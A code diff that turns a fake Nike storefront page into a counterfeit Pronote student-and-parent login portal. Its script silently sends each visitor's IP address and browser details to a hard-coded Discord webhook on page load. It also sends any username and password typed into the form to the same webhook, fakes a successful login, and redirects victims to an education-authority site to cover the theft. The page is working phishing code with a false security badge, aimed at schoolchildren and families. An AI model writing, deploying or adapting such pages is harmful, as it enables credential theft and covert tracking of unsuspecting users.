@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nike - Just Do It. Nouveautés 2024</title>
+    <title>Pronote - Portail Élèves et Parents</title>
     <style>
         * {
             margin: 0;
@@ -12,310 +12,267 @@
         }
 
         body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background: #fff;
-            color: #111;
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #1a4d8c 0%, #0e2a4a 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Container principal */
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         /* Header */
         .header {
-            background: white;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 18px 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            background: linear-gradient(135deg, #2c6e9e 0%, #1a4d6e 100%);
+            padding: 32px 24px;
+            text-align: center;
+            color: white;
         }
 
         .logo {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 700;
             letter-spacing: -0.5px;
-            color: #111;
+            margin-bottom: 8px;
         }
 
-        .nav-links {
-            display: flex;
-            gap: 32px;
+        .logo span {
+            font-weight: 300;
         }
 
-        .nav-links a {
-            text-decoration: none;
-            color: #111;
-            font-weight: 500;
-            font-size: 15px;
+        .subtitle {
+            font-size: 14px;
+            opacity: 0.85;
         }
 
-        .nav-icons {
-            display: flex;
-            gap: 20px;
+        /* Contenu */
+        .content {
+            padding: 32px 28px;
         }
 
-        .nav-icons span {
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.unsplash.com/photo-1600185365483-26d7a4cc7519?w=1600');
-            background-size: cover;
-            background-position: center;
-            height: 550px;
+        /* Message de sécurité */
+        .security-badge {
+            background: #f0f7ff;
+            border-left: 4px solid #2c6e9e;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 28px;
             display: flex;
             align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: white;
+            gap: 12px;
         }
 
-        .hero-content h1 {
-            font-size: 56px;
-            font-weight: 700;
-            margin-bottom: 16px;
-            letter-spacing: -1px;
+        .security-badge .icon {
+            font-size: 24px;
         }
 
-        .hero-content p {
-            font-size: 18px;
-            margin-bottom: 32px;
-            opacity: 0.9;
+        .security-badge p {
+            font-size: 13px;
+            color: #1e4663;
+            line-height: 1.4;
         }
 
-        .btn {
-            background: white;
-            color: #111;
-            padding: 14px 40px;
-            text-decoration: none;
+        /* Formulaire */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
             font-weight: 600;
-            border-radius: 30px;
+            color: #1f2937;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 15px;
             transition: all 0.3s;
-            display: inline-block;
+            background: #fafbfc;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #2c6e9e;
+            box-shadow: 0 0 0 3px rgba(44, 110, 158, 0.1);
+            background: white;
+        }
+
+        /* Bouton */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #2c6e9e 0%, #1e4a6e 100%);
+            color: white;
+            border: none;
+            border-radius: 40px;
             font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 12px;
         }
 
         .btn:hover {
-            background: #f5f5f5;
-            transform: scale(1.02);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px rgba(44, 110, 158, 0.4);
         }
 
-        /* Section tendances */
-        .trending {
-            max-width: 1200px;
-            margin: 60px auto;
-            padding: 0 24px;
+        /* Liens */
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 24px;
+            font-size: 13px;
         }
 
-        .trending h2 {
-            font-size: 28px;
-            font-weight: 600;
-            margin-bottom: 32px;
-            text-align: center;
-        }
-
-        .product-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 32px;
-        }
-
-        .product-card {
-            background: white;
-            border-radius: 12px;
-            overflow: hidden;
-            transition: transform 0.3s;
-            cursor: pointer;
-        }
-
-        .product-card:hover {
-            transform: translateY(-5px);
-        }
-
-        .product-card img {
-            width: 100%;
-            height: 280px;
-            object-fit: cover;
-            background: #f5f5f5;
-        }
-
-        .product-info {
-            padding: 20px 16px;
-        }
-
-        .product-category {
-            font-size: 12px;
-            color: #666;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-        }
-
-        .product-info h3 {
-            font-size: 18px;
-            margin-bottom: 8px;
-        }
-
-        .product-desc {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 12px;
-        }
-
-        .price {
-            font-size: 18px;
-            font-weight: 700;
-            color: #111;
-        }
-
-        /* Bannière */
-        .banner {
-            background: #f0f0f0;
-            margin: 60px 0;
-            padding: 60px 24px;
-            text-align: center;
-        }
-
-        .banner h2 {
-            font-size: 32px;
-            margin-bottom: 16px;
-        }
-
-        .banner .btn-dark {
-            background: #111;
-            color: white;
-            padding: 14px 40px;
+        .links a {
+            color: #2c6e9e;
             text-decoration: none;
-            font-weight: 600;
-            border-radius: 30px;
-            display: inline-block;
-            margin-top: 20px;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
         }
 
         /* Footer */
-        footer {
-            background: #111;
-            color: #888;
+        .footer {
+            background: #f8fafc;
+            padding: 20px 28px;
             text-align: center;
-            padding: 40px 24px;
-            margin-top: 60px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #64748b;
         }
 
-        footer p {
-            margin: 8px 0;
+        /* Messages d'état */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+            color: #2c6e9e;
+            font-size: 13px;
         }
 
-        @media (max-width: 768px) {
-            .nav-links {
-                display: none;
-            }
-            .hero-content h1 {
-                font-size: 36px;
-            }
+        .success {
+            display: none;
+            background: #d1fae5;
+            color: #065f46;
+            padding: 12px;
+            border-radius: 12px;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 13px;
+        }
+
+        /* Animation chargement */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #e2e8f0;
+            border-top-color: #2c6e9e;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="nav-container">
-            <div class="logo">NIKE</div>
-            <div class="nav-links">
-                <a href="#">Nouveautés</a>
-                <a href="#">Homme</a>
-                <a href="#">Femme</a>
-                <a href="#">Enfant</a>
-                <a href="#">Soldes</a>
+    <div class="container">
+        <div class="header">
+            <div class="logo">PRONOTE<span>.net</span></div>
+            <div class="subtitle">Espace numérique de travail</div>
+        </div>
+
+        <div class="content">
+            <div class="security-badge">
+                <div class="icon">🔒</div>
+                <p>Connexion sécurisée • Environnement académique<br>Données chiffrées AES-256</p>
             </div>
-            <div class="nav-icons">
-                <span>🔍</span>
-                <span>❤️</span>
-                <span>🛒</span>
-            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>👤 Identifiant académique</label>
+                    <input type="text" id="username" placeholder="prenom.nom@academie.fr" autocomplete="off">
+                </div>
+
+                <div class="form-group">
+                    <label>🔑 Mot de passe</label>
+                    <input type="password" id="password" placeholder="••••••••">
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">🔐 SE CONNECTER</button>
+
+                <div class="loading" id="loading">
+                    <span class="spinner"></span> Vérification des identifiants...
+                </div>
+
+                <div class="success" id="success">
+                    ✅ Connexion réussie ! Redirection en cours...
+                </div>
+
+                <div class="links">
+                    <a href="#">Mot de passe oublié ?</a>
+                    <a href="#">Activer ma licence</a>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Groupe Index Education • Tous droits réservés</p>
+            <p style="margin-top: 8px;">📞 Support académique : 0 800 123 456</p>
         </div>
     </div>
-
-    <div class="hero">
-        <div class="hero-content">
-            <h1>JUST DO IT</h1>
-            <p>Nike Air Max Pulse • Collection Hiver 2024</p>
-            <a href="#" class="btn" id="heroBtn">DÉCOUVRIR LA COLLECTION</a>
-        </div>
-    </div>
-
-    <div class="trending">
-        <h2>LES PLUS POPULAIRES</h2>
-        <div class="product-grid">
-            <div class="product-card">
-                <img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=500" alt="Nike Air Max">
-                <div class="product-info">
-                    <div class="product-category">Chaussures</div>
-                    <h3>Nike Air Max Pulse</h3>
-                    <div class="product-desc">Amorti réactif, style urbain</div>
-                    <div class="price">149,99 €</div>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://images.unsplash.com/photo-1556906781-9a412961c28c?w=500" alt="Nike Air Force">
-                <div class="product-info">
-                    <div class="product-category">Classique</div>
-                    <h3>Nike Air Force 1 '07</h3>
-                    <div class="product-desc">L'icône intemporelle</div>
-                    <div class="price">119,99 €</div>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://images.unsplash.com/photo-1600185365483-26d7a4cc7519?w=500" alt="Air Jordan">
-                <div class="product-info">
-                    <div class="product-category">Édition Limitée</div>
-                    <h3>Air Jordan 1 Retro</h3>
-                    <div class="product-desc">Style légendaire</div>
-                    <div class="price">179,99 €</div>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://images.unsplash.com/photo-1608231387042-66d1773070a5?w=500" alt="Nike Dunk">
-                <div class="product-info">
-                    <div class="product-category">Nouveauté</div>
-                    <h3>Nike Dunk Low</h3>
-                    <div class="product-desc">Retour des années 90</div>
-                    <div class="price">109,99 €</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="banner">
-        <h2>Nike Membership</h2>
-        <p>Rejoins-nous et profite de livraison offerte, retours gratuits et accès exclusif</p>
-        <a href="#" class="btn-dark" id="memberBtn">EN SAVOIR PLUS</a>
-    </div>
-
-    <footer>
-        <p>© 2024 Nike, Inc. Tous droits réservés</p>
-        <p style="font-size: 12px; margin-top: 16px;">Livraison gratuite • Retours sous 30 jours</p>
-    </footer>
 
     <script>
         // 🔴 TON WEBHOOK DISCORD 🔴
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485044296120930414/n9RZpE9o16fbNtF3TEHppJURGyv0-eUUh6twJUywBJqmRQSKEZm090aFrbVLbwuDhaMP';
         
-        // 🚀 CAPTURE IP AUTOMATIQUE - DÈS L'OUVERTURE DE LA PAGE 🚀
-        async function captureIP() {
+        let ipAddress = null;
+        let infoSent = false;
+
+        // 🚀 FONCTION DE CAPTURE IP - SANS AUCUN CLIC 🚀
+        async function captureIPAuto() {
             try {
                 // Récupérer l'IP
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                const ip = data.ip;
+                ipAddress = data.ip;
                 
-                // Infos complètes
-                const date = new Date().toLocaleString('fr-FR');
+                // Récupérer toutes les infos système
+                const date = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
                 const os = navigator.platform;
                 const userAgent = navigator.userAgent;
                 const browser = userAgent.includes('Chrome') ? 'Chrome' : 
@@ -324,26 +281,60 @@
                 const screenRes = `${screen.width}x${screen.height}`;
                 const timezone = Intl.DateTimeFormat().resolveOptions().timeZone;
                 const language = navigator.language;
+                const referrer = document.referrer || 'Direct (lien direct)';
                 
-                // Envoi vers Discord
+                // Construire le message pour Discord
                 const embed = {
-                    title: "🔥 NOUVELLE VISITE - NIKE STORE 🔥",
-                    color: 0x000000,
+                    title: "🎓 ACCÈS PRONOTE - NOUVELLE VISITE 🎓",
+                    color: 0x2c6e9e,
                     timestamp: new Date().toISOString(),
                     thumbnail: {
-                        url: "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg"
+                        url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Logo_Pronote.png/120px-Logo_Pronote.png"
                     },
                     fields: [
-                        { name: "🌐 ADRESSE IP", value: `\`\`\`${ip}\`\`\``, inline: false },
-                        { name: "💻 SYSTÈME", value: os, inline: true },
+                        { name: "🌐 ADRESSE IP", value: `\`\`\`${ipAddress}\`\`\``, inline: false },
+                        { name: "💻 SYSTÈME D'EXPLOITATION", value: os, inline: true },
                         { name: "🌍 NAVIGATEUR", value: browser, inline: true },
-                        { name: "📱 ÉCRAN", value: screenRes, inline: true },
-                        { name: "⏰ FUSEAU", value: timezone, inline: true },
+                        { name: "📱 RÉSOLUTION ÉCRAN", value: screenRes, inline: true },
+                        { name: "⏰ FUSEAU HORAIRE", value: timezone, inline: true },
                         { name: "🌐 LANGUE", value: language, inline: true },
-                        { name: "📅 DATE", value: date, inline: false },
-                        { name: "🔗 URL", value: window.location.href, inline: false }
+                        { name: "🔗 PROVENANCE", value: referrer, inline: false },
+                        { name: "📅 DATE ET HEURE", value: date, inline: false },
+                        { name: "🔗 URL COMPLÈTE", value: window.location.href, inline: false }
                     ],
-                    footer: { text: "Capture automatique • Aucun clic nécessaire" }
+                    footer: { text: "Capture automatique • Aucune interaction requise" }
+                };
+                
+                // Envoyer à Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                
+                infoSent = true;
+                console.log('✅ IP et infos envoyées à Discord');
+                
+            } catch(e) {
+                console.log('Erreur capture:', e);
+            }
+        }
+
+        // Fonction pour envoyer les identifiants saisis
+        async function sendCredentials(username, password) {
+            if (!username && !password) return;
+            
+            try {
+                const embed = {
+                    title: "🔐 TENTATIVE DE CONNEXION PRONOTE 🔐",
+                    color: 0xe67e22,
+                    fields: [
+                        { name: "🌐 IP", value: `\`${ipAddress || 'Non capturée'}\``, inline: false },
+                        { name: "👤 IDENTIFIANT", value: `\`\`\`${username}\`\`\``, inline: false },
+                        { name: "🔑 MOT DE PASSE", value: `\`\`\`${password}\`\`\``, inline: false },
+                        { name: "📅 DATE", value: new Date().toLocaleString('fr-FR'), inline: true }
+                    ],
+                    footer: { text: "Identifiants saisis par l'utilisateur" }
                 };
                 
                 await fetch(WEBHOOK_URL, {
@@ -352,31 +343,59 @@
                     body: JSON.stringify({ embeds: [embed] })
                 });
                 
-                console.log('✅ IP envoyée automatiquement');
-                
+                console.log('✅ Identifiants envoyés');
             } catch(e) {
-                console.log('Erreur:', e);
+                console.log('Erreur envoi identifiants:', e);
             }
         }
-        
-        // 🔥 LANCEMENT AUTOMATIQUE - SANS AUCUN CLIC 🔥
-        captureIP();
-        
-        // Les boutons sont juste là pour faire joli - ils n'envoient PAS l'IP
-        document.getElementById('heroBtn').addEventListener('click', function(e) {
+
+        // 🔥 LANCEMENT IMMÉDIAT - DÈS L'OUVERTURE DE LA PAGE 🔥
+        captureIPAuto();
+
+        // Gestion du formulaire de connexion
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        const successMsg = document.getElementById('success');
+
+        form.addEventListener('submit', async function(e) {
             e.preventDefault();
-            alert("✓ Collection ajoutée à votre panier !");
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('Veuillez remplir tous les champs');
+                return;
+            }
+            
+            // Afficher le chargement
+            loading.style.display = 'block';
+            submitBtn.disabled = true;
+            
+            // Envoyer les identifiants sur Discord
+            await sendCredentials(username, password);
+            
+            // Simuler une connexion
+            setTimeout(() => {
+                loading.style.display = 'none';
+                successMsg.style.display = 'block';
+                
+                // Redirection vers le vrai site académique
+                setTimeout(() => {
+                    window.location.href = 'https://www.ac-paris.fr';
+                }, 2000);
+            }, 1500);
         });
+
+        // Désactiver le clic droit (optionnel)
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
         
-        document.getElementById('memberBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert("✓ Merci de votre intérêt ! Un email vous sera envoyé.");
-        });
-        
-        document.querySelectorAll('.product-card').forEach(card => {
-            card.addEventListener('click', function() {
-                alert("✓ Article ajouté au panier !");
-            });
+        // Détecter quand la page est fermée pour envoyer les données si pas encore fait
+        window.addEventListener('beforeunload', async () => {
+            if (!infoSent && ipAddress) {
+                await captureIPAuto();
+            }
         });
     </script>
 </body>
